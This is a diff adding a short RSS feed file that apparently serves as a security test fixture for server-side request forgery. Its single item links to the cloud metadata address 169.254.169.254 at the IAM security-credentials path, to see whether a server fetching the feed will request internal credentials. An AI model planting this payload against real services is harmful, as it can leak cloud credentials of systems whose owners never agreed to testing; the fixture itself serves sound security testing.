@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+  <channel>
+    <title>Security Test Feed</title>
+    <link>http://localhost</link>
+    <description>Testing SSRF via RSS Feed</description>
+    <item>
+      <title>Metadata Grabber</title>
+      <link>http://169.254.169.254/latest/meta-data/iam/security-credentials/</link>
+      <description>Check if the server fetches internal cloud metadata</description>
+    </item>
+  </channel>
+</rss>
